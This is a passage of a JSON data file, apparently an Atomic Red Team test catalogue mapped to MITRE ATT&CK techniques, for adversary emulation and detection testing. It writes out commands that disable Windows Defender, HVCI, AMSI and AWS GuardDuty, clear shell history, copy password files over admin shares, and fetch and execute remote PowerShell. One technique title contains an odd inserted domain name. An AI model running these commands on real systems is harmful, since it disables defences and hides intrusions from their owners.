is needed.\nThis method will remove Defender and it's packages.\nReference: https://docs.microsoft.com/en-us/powershell/module/dism/disable-windowsoptionalfeature?view=windowsserver2022-ps\n", "supported_platforms": ["windows"], "executor": {"command": "Disable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-Gui\" -NoRestart -ErrorAction Ignore\nDisable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-Features\" -NoRestart -ErrorAction Ignore\nDisable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender\" -NoRestart -ErrorAction Ignore\nDisable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-ApplicationGuard\" -NoRestart -ErrorAction Ignore", "name": "powershell", "elevation_required": true}}, {"name": "WMIC Tamper with Windows Defender Evade Scanning Folder", "auto_generated_guid": "59d386fc-3a4b-41b8-850d-9e3eee24dfe4", "description": "The following Atomic will attempt to exclude a folder within Defender leveraging WMI\nReference: https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/\n", "supported_platforms": ["windows"], "executor": {"command": "wmic.exe /Namespace:\\\\root\\Microsoft\\Windows\\Defender class MSFT_MpPreference call Add ExclusionPath=\\\"ATOMICREDTEAM\\\"\n", "cleanup_command": "wmic.exe /Namespace:\\\\root\\Microsoft\\Windows\\Defender class MSFT_MpPreference call Remove ExclusionPath=\\\"ATOMICREDTEAM\\\"\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Delete Windows Defender Scheduled Tasks", "auto_generated_guid": "4b841aa1-0d05-4b32-bbe7-7564346e7c76", "description": "The following atomic test will delete the Windows Defender scheduled tasks.\n\n[Reference](https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/)\n", "supported_platforms": ["windows"], "dependencies": [{"description": "The Windows Defender scheduled tasks must be backed up first\n", "prereq_command": "IF EXIST \"%temp%\\Windows_Defender_Scheduled_Scan.xml\" ( EXIT 0 ) ELSE ( EXIT 1 )\n", "get_prereq_command": "schtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" > \"%temp%\\Windows_Defender_Scheduled_Scan.xml\"\nschtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" > \"%temp%\\Windows_Defender_Cleanup.xml\"\nschtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" > \"%temp%\\Windows_Defender_Verification.xml\"\nschtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" > \"%temp%\\Windows_Defender_Cache_Maintenance.xml\"\n"}], "executor": {"command": "IF EXIST \"%temp%\\Windows_Defender_Scheduled_Scan.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f )\nIF EXIST \"%temp%\\Windows_Defender_Cleanup.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /f )\nIF EXIST \"%temp%\\Windows_Defender_Verification.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /f )\nIF EXIST \"%temp%\\Windows_Defender_Cache_Maintenance.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /f )\n", "cleanup_command": "schtasks /create /xml \"%temp%\\Windows_Defender_Scheduled_Scan.xml\" /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f\nschtasks /create /xml \"%temp%\\Windows_Defender_Cleanup.xml\" /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /f\nschtasks /create /xml \"%temp%\\Windows_Defender_Verification.xml\" /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /f\nschtasks /create /xml \"%temp%\\Windows_Defender_Cache_Maintenance.xml\" /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /f\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Clear History", "auto_generated_guid": "23b88394-091b-4968-a42d-fb8076992443", "description": "Clear Shell History. This technique only affect the bash shell application. \n", "supported_platforms": ["linux"], "executor": {"command": "history -c\n", "name": "sh", "elevation_required": true}}, {"name": "Suspend History", "auto_generated_guid": "94f6a1c9-aae7-46a4-9083-2bb1f5768ec4", "description": "suspend Shell History seen in Awfulshred wiper- https://unix.stackexchange.com/questions/10922/temporarily-suspend-bash-history-on-a-given-shell\n", "supported_platforms": ["linux"], "executor": {"command": "set +o history\n", "cleanup_command": "set -o history\n", "name": "sh", "elevation_required": true}}, {"name": "Reboot Linux Host via Kernel System Request", "auto_generated_guid": "6d6d3154-1a52-4d1a-9d51-92ab8148b32e", "description": "reboot system via system request seen in Awfulshred wiper.\n", "supported_platforms": ["linux"], "executor": {"command": "echo 1> /proc/sys/kernel/sysrq \necho b> /proc/sysrq-trigger \n", "name": "sh", "elevation_required": true}}, {"name": "Clear Pagging Cache", "auto_generated_guid": "f790927b-ea85-4a16-b7b2-7eb44176a510", "description": "clear pagging cache via system request. This is a temporary change in the system to clear paging cache. This technique seen in Awfulshred wiper as part\nof its malicious payload on the compromised host. added reference link for this technique: https://www.tecmint.com/clear-ram-memory-cache-buffer-and-swap-space-on-linux/\n", "supported_platforms": ["linux"], "executor": {"command": "free && echo 3 > /proc/sys/vm/drop_caches && free\necho 3> /proc/sys/vm/drop_caches \n", "name": "sh", "elevation_required": true}}, {"name": "Disable Memory Swap", "auto_generated_guid": "e74e4c63-6fde-4ad2-9ee8-21c3a1733114", "description": "disable swapping of device paging that impaire the compromised host to swap data if the RAM is full. Awfulshred wiper used this technique as an additional \npayload to the compromised host and to make sure that there will be no recoverable data due to swap feature of FreeBSD/linux.\n", "supported_platforms": ["linux"], "executor": {"command": "swapon -a \nsleep 2\nswapoff -a\nsync\n", "cleanup_command": "swapon -a\nsleep 2\nsync\n", "name": "sh", "elevation_required": true}}, {"name": "Disable Hypervisor-Enforced Code Integrity (HVCI)", "auto_generated_guid": "70bd71e6-eba4-4e00-92f7-617911dbe020", "description": "This test disables Hypervisor-Enforced Code Integrity (HVCI) by setting the registry key HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity \"Enabled\" value to \"0\".\nThe pre-req needs to be ran in order to setup HVCI and have it enabled. \nWe do not recommend running this in production.\n[Black Lotus Campaign](https://www.microsoft.com/en-us/security/blog/2023/04/11/guidance-for-investigating-attacks-using-cve-2022-21894-the-blacklotus-campaign/)\n[Microsoft](https://learn.microsoft.com/en-us/windows/security/threat-protection/device-guard/enable-virtualization-based-protection-of-code-integrity)\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "HVCI must be enabled\n", "prereq_command": "if (((cmd.exe /c \"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"EnableVirtualizationBasedSecurity\" 2> nul | findstr EnableVirtualizationBasedSecurity 2> nul\") -and (cmd.exe /c \"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"RequirePlatformSecurityFeatures\" 2> nul | findstr RequirePlatformSecurityFeatures 2> nul\") -and (cmd.exe /c \"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"Locked\" 2> nul | findstr Locked 2> nul\") -and (cmd.exe /c \"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Enabled\" 2> nul | findstr Enabled 2> nul\") -and (cmd.exe /c \"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Locked\" 2> nul | findstr Locked 2> nul\"))) { exit 0 } else { exit 1 }\n", "get_prereq_command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"EnableVirtualizationBasedSecurity\" /t REG_DWORD /d 1 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"RequirePlatformSecurityFeatures\" /t REG_DWORD /d 1 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"Locked\" /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Enabled\" /t REG_DWORD /d 1 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Locked\" /t REG_DWORD /d 0 /f\n"}], "executor": {"command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Enabled\" /t REG_DWORD /d 0 /f\n", "cleanup_command": "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"EnableVirtualizationBasedSecurity\" /f\nreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"RequirePlatformSecurityFeatures\" /f\nreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"Locked\" /f\nreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Enabled\" /f\nreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Locked\" /f\n", "name": "powershell", "elevation_required": true}}, {"name": "AMSI Bypass - Override AMSI via COM", "auto_generated_guid": "17538258-5699-4ff1-92d1-5ac9b0dc21f5", "description": "With administrative rights, an adversary can disable AMSI via registry value in HKCU\\Software\\Classes\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec} by overriding the Microsoft Defender COM object for AMSI and points it to a DLL that does not exist.\nThis is currently being used by AsyncRAT and others. \nhttps://strontic.github.io/xcyclopedia/library/clsid_fdb00e52-a214-4aa1-8fba-4357bb0072ec.html\nhttps://securitynews.sonicwall.com/xmlpost/asyncrat-variant-includes-cryptostealer-capabilites/\n", "supported_platforms": ["windows"], "executor": {"command": "REG ADD HKCU\\Software\\Classes\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\\InProcServer32 /ve /t REG_SZ /d C:\\IDontExist.dll /f\n", "cleanup_command": "REG DELETE HKCU\\Software\\Classes\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\\InProcServer32 /f\n", "name": "command_prompt", "elevation_required": true}}, {"name": "AWS - GuardDuty Suspension or Deletion", "auto_generated_guid": "11e65d8d-e7e4-470e-a3ff-82bc56ad938e", "description": "Enables GuardDuty in AWS, upon successful creation this test will suspend and then delete the GuardDuty configuration.\n", "supported_platforms": ["iaas:aws"], "input_arguments": {"region": {"description": "Name of the specified region", "type": "string", "default": "us-east-1"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "Check if ~/.aws/credentials file has a default stanza is configured\n", "prereq_command": "cat ~/.aws/credentials | grep \"default\"\n", "get_prereq_command": "echo \"Please install the aws-cli and configure your AWS default profile using: aws configure\"\n"}], "executor": {"command": "detectorId=$(aws guardduty create-detector --enable --region \"#{region}\" | grep -oP '(?<=\"DetectorId\": \")[^\"]*')\naws guardduty update-detector --no-enable --detector-id $detectorId\naws guardduty delete-detector --detector-id $detectorId\n", "cleanup_command": "echo \"If test successfully ran, no cleanup required.\"\n", "name": "bash", "elevation_required": false}}, {"name": "Tamper with Defender ATP on Linux/MacOS", "auto_generated_guid": "40074085-dbc8-492b-90a3-11bcfc52fda8", "description": "With root privileges, an adversary can disable real time protection. Note, this test assumes Defender is not in passive mode and real-time protection is enabled. The use of a managed.json on Linux or Defender .plist on MacOS will prevent these changes. Tamper protection will also prevent this (available on MacOS, but not Linux at the time of writing). Installation of MDATP is a prerequisite. Installation steps vary across MacOS and Linux distros. See Microsoft public documentation for instructions: https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/mac-install-manually?view=o365-worldwide https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/linux-install-manually?view=o365-worldwide\n", "supported_platforms": ["linux", "macos"], "executor": {"command": "sudo mdatp config real-time-protection --value disabled\n", "cleanup_command": "sudo mdatp config real-time-protection --value enabled\n", "name": "sh", "elevation_required": true}}]}, "T1559": {"name": "Inter-Process Communication", "technique_id": "attack-pattern--acd0ba37-7ba9-4cc5-ac61-796586cd856d", "external_id": "T1559", "data_components": ["Process Access", "Module Load", "Process Creation", "Script Execution"], "kill_chain_phases": ["execution"], "data_source_platforms": [], "mitigations": ["course-of-action--25dc1ce8-eb55-4333-ae30-a7cb4f5894a1", "course-of-action--90f39ee1-d5a3-4aaa-9f28-3b42815b0d46", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--b5dbb4c5-b0b1-40b1-80b6-e9e84ab90067", "course-of-action--b9f0c069-abbe-4a07-a245-2481219a1463", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern. \n\nAdversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages/libraries or native interfaces such as Windows [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) or [Component Object Model](https://attack.mitre.org/techniques/T1559/001). Linux environments support several different IPC mechanisms, two of which being sockets and pipes.(Citation: Linux IPC) Higher level execution mediums, such as those of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s, may also leverage underlying IPC mechanisms. Adversaries may also use [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) to facilitate remote IPC execution.(Citation: Fireeye Hunting COM June 2019)", "atomic_tests": [{"name": "Cobalt Strike Artifact Kit pipe", "auto_generated_guid": "bd13b9fc-b758-496a-b81a-397462f82c72", "description": "Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.\n\nThe named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "Named pipe executors must exist on disk\n", "prereq_command": "if ((Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\") -and (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_client.exe\") -and (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_server.exe\")) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing)\n$zipUrl  = \"https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/micro_emulation_plans/src/named_pipes/named_pipes.zip\"\nInvoke-FetchFromZip $zipUrl \"*.exe\" \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n"}], "executor": {"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 1\n", "name": "command_prompt"}}, {"name": "Cobalt Strike Lateral Movement (psexec_psh) pipe", "auto_generated_guid": "830c8b6c-7a70-4f40-b975-8bbe74558acd", "description": "Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.\n\nThe named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "Named pipe executors must exist on disk\n", "prereq_command": "if ((Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\") -and (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_client.exe\") -and (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_server.exe\")) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing)\n$zipUrl  = \"https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/micro_emulation_plans/src/named_pipes/named_pipes.zip\"\nInvoke-FetchFromZip $zipUrl \"*.exe\" \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n"}], "executor": {"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 2\n", "name": "command_prompt"}}, {"name": "Cobalt Strike SSH (postex_ssh) pipe", "auto_generated_guid": "d1f72fa0-5bc2-4b4b-bd1e-43b6e8cfb2e6", "description": "Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.\n\nThe named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "Named pipe executors must exist on disk\n", "prereq_command": "if ((Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\") -and (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_client.exe\") -and (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_server.exe\")) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing)\n$zipUrl  = \"https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/micro_emulation_plans/src/named_pipes/named_pipes.zip\"\nInvoke-FetchFromZip $zipUrl \"*.exe\" \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n"}], "executor": {"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 3\n", "name": "command_prompt"}}, {"name": "Cobalt Strike post-exploitation pipe (4.2 and later)", "auto_generated_guid": "7a48f482-246f-4aeb-9837-21c271ebf244", "description": "Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.\n\nThe named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "Named pipe executors must exist on disk\n", "prereq_command": "if ((Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\") -and (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_client.exe\") -and (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_server.exe\")) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing)\n$zipUrl  = \"https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/micro_emulation_plans/src/named_pipes/named_pipes.zip\"\nInvoke-FetchFromZip $zipUrl \"*.exe\" \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n"}], "executor": {"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 4\n", "name": "command_prompt"}}, {"name": "Cobalt Strike post-exploitation pipe (before 4.2)", "auto_generated_guid": "8dbfc15c-527b-4ab0-a272-019f469d367f", "description": "Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.\n\nThe named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "Named pipe executors must exist on disk\n", "prereq_command": "if ((Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\") -and (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_client.exe\") -and (\"Test-Path PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_server.exe\")) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing)\n$zipUrl  = \"https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/micro_emulation_plans/src/named_pipes/named_pipes.zip\"\nInvoke-FetchFromZip $zipUrl \"*.exe\" \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n"}], "executor": {"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 5\n", "name": "command_prompt"}}]}, "T1039": {"name": "Data from cyberwheel.network Shared Drive", "technique_id": "attack-pattern--ae676644-d2d2-41b7-af7e-9bed1b55898c", "external_id": "T1039", "data_components": ["Command Execution", "Network Traffic Content", "Network Share Access", "Network Connection Creation", "File Access"], "kill_chain_phases": ["collection"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information.", "atomic_tests": [{"name": "Copy a sensitive File over Administrative share with copy", "auto_generated_guid": "6ed67921-1774-44ba-bac6-adb51ed60660", "description": "Copy from sensitive File from the c$ of another LAN computer with copy cmd\nhttps://twitter.com/SBousseaden/status/1211636381086339073", "supported_platforms": ["windows"], "input_arguments": {"remote": {"description": "Remote server name", "type": "string", "default": "127.0.0.1"}, "share_file": {"description": "Remote Path to the file", "type": "path", "default": "Windows\\temp\\Easter_Bunny.password"}, "local_file": {"description": "Local name", "type": "string", "default": "Easter_egg.password"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Administrative share must exist on #{remote}\n", "prereq_command": "if (Test-Path \"\\\\#{remote}\\C$\") {exit 0} else {exit 1}\n", "get_prereq_command": "Write-Host 'Please Enable \"C$\" share on #{remote}'\n"}, {"description": "\"\\\\#{remote}\\C$\\#{share_file}\" must exist on #{remote}\n", "prereq_command": "if (Test-Path \"\\\\#{remote}\\C$\\#{share_file}\") {exit 0} else {exit 1}\n", "get_prereq_command": "Out-File -FilePath \"\\\\#{remote}\\C$\\#{share_file}\"\n"}], "executor": {"command": "copy \\\\#{remote}\\C$\\#{share_file} %TEMP%\\#{local_file}", "cleanup_command": "del \\\\#{remote}\\C$\\#{share_file}\ndel %TEMP%\\#{local_file}", "name": "command_prompt", "elevation_required": true}}, {"name": "Copy a sensitive File over Administrative share with Powershell", "auto_generated_guid": "7762e120-5879-44ff-97f8-008b401b9a98", "description": "Copy from sensitive File from the c$ of another LAN computer with powershell\nhttps://twitter.com/SBousseaden/status/1211636381086339073", "supported_platforms": ["windows"], "input_arguments": {"remote": {"description": "Remote server name", "type": "string", "default": "127.0.0.1"}, "share_file": {"description": "Remote Path to the file", "type": "path", "default": "Windows\\temp\\Easter_Bunny.password"}, "local_file": {"description": "Local name", "type": "string", "default": "Easter_egg.password"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Administrative share must exist on #{remote}\n", "prereq_command": "if (Test-Path \"\\\\#{remote}\\C$\") {exit 0} else {exit 1}\n", "get_prereq_command": "Write-Host 'Please Enable \"C$\" share on #{remote}'\n"}, {"description": "\"\\\\#{remote}\\C$\\#{share_file}\" must exist on #{remote}\n", "prereq_command": "if (Test-Path \"\\\\#{remote}\\C$\\#{share_file}\") {exit 0} else {exit 1}\n", "get_prereq_command": "Out-File -FilePath \"\\\\#{remote}\\C$\\#{share_file}\"\n"}], "executor": {"command": "copy-item -Path \"\\\\#{remote}\\C$\\#{share_file}\" -Destination \"$Env:TEMP\\#{local_file}\"", "cleanup_command": "Remove-Item -Path \"\\\\#{remote}\\C$\\#{share_file}\"\nRemove-Item -Path \"$Env:TEMP\\#{local_file}\"", "name": "powershell", "elevation_required": true}}]}, "T1204.003": {"name": "Malicious Image", "technique_id": "attack-pattern--b0c74ef9-c61e-4986-88cb-78da98a355ec", "external_id": "T1204.003", "data_components": ["Application Log Content", "Container Creation", "Container Start", "Instance Start", "Instance Creation", "Command Execution", "Image Creation"], "kill_chain_phases": ["execution"], "data_source_platforms": [], "mitigations": ["course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c", "course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a", "course-of-action--590777b3-b475-4c7c-aaf8-f4a73b140312", "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8"], "description": "Adversaries may rely on a user running a malicious image to facilitate execution. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be backdoored. Backdoored images may be uploaded to a public repository via [Upload Malware](https://attack.mitre.org/techniques/T1608/001), and users may then download and deploy an instance or container from the image without realizing the image is malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that executes cryptocurrency mining, in the instance or container.(Citation: Summit Route Malicious AMIs)\n\nAdversaries may also name images a certain way to increase the chance of users mistakenly deploying an instance or container from the image (ex: [Match Legitimate Name or Location](https://attack.mitre.org/techniques/T1036/005)).(Citation: Aqua Security Cloud Native Threat Report June 2021)", "atomic_tests": [{"name": "Malicious Execution from Mounted ISO Image", "auto_generated_guid": "e9795c8d-42aa-4ed4-ad80-551ed793d006", "description": "Adversaries may rely on a user running a malicious image to facilitate execution", "supported_platforms": ["windows"], "executor": {"command": "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.003/src/qbot-test.iso\" -OutFile \"$env:TEMP\\qbot-test.iso\")\nMount-DiskImage -ImagePath \"$env:TEMP\\qbot-test.iso\"\n$mountedpath = (Get-DiskImage -ImagePath \"$env:TEMP\\qbot-test.iso\" | Get-Volume).DriveLetter\n$finalpath = $mountedpath + \":\\\"\ncd $finalpath\n.\\calc.exe.lnk", "cleanup_command": "start-sleep -s 5\nstop-process -Name \"Calculatorapp\" -Force \ndismount-diskimage -ImagePath \"$env:TEMP\\qbot-test.iso\"", "name": "powershell", "elevation_required": true}}]}, "T1571": {"name": "Non-Standard Port", "technique_id": "attack-pattern--b18eae87-b469-4e14-b454-b171b416bc18", "external_id": "T1571", "data_components": ["Network Traffic Content", "Network Traffic Flow"], "kill_chain_phases": ["command-and-control"], "data_source_platforms": [], "mitigations": ["course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c", "course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c"], "description": "Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.\n\nAdversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.(Citation: change_rdp_port_conti)", "atomic_tests": [{"name": "Testing usage of uncommonly used port with PowerShell", "auto_generated_guid": "21fe622f-8e53-4b31-ba83-6d333c2583f4", "description": "Testing uncommonly used port utilizing PowerShell. APT33 has been known to attempt telnet over port 8081. Upon execution, details about the successful\nport check will be displayed.\n", "supported_platforms": ["windows"], "input_arguments": {"port": {"description": "Specify uncommon port number", "type": "string", "default": "8081"}, "domain": {"description": "Specify target hostname", "type": "string", "default": "google.com"}}, "executor": {"command": "Test-NetConnection -ComputerName #{domain} -port #{port}\n", "name": "powershell"}}, {"name": "Testing usage of uncommonly used port", "auto_generated_guid": "5db21e1d-dd9c-4a50-b885-b1e748912767", "description": "Testing 